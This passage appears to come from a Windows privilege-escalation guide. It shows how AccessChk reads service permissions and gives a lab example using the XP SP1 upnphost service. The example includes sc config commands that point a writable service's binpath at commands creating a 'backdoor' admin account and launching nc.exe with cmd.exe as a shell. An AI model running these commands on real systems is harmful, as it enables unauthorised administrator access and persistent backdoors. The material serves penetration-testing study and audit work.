## Current operation: Read a named service's effective rights for a principal

**Run in:** Windows cmd.exe. **Requires:** The Sysinternals AccessChk build, a valid identity/service and acceptance of its license prompt when first run.

```console
accesschk.exe -c -v "DOMAIN\USER" SERVICE_NAME
```

**Read the result:** Tie reported rights to the exact user/group and object type being checked.

**If The service is queryable but lacks configuration or start rights:** Service-configuration access, executable write access and directory write access are distinct conditions; examine each part of a proposed path.

**Next check:** Record the specific rights and compare binary/directory permissions; one permitted service operation does not imply full control.

**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.

### Example 1: Example with Windows XP SP1 - upnphost

Run in: **Notebook example**. Saved as written; may include lab values or terminal output.

```powershell
$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

$ accesschk.exe -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS

$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
$ sc stop <vuln-service>
$ sc start <vuln-service>
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
```
